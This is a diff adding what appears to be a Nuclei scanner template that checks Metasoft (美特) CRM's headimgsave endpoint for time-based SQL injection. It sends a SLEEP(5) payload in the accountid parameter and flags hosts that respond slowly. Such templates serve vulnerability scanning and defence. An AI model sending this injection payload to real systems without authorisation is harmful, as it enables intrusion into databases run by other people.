@@ -1,0 +1,32 @@
+id: metasoft-crm-headimgsave-sqli
+info:
+  name: 美特CRM headimgsave存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/%E7%BE%8E%E7%89%B9CRM/%E7%BE%8E%E7%89%B9CRM%20headimgsave%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,metasoft
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /headimgsave?accountid=1'+AND+(SELECT+5+FROM+(SELECT+SLEEP(5))qaz)--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
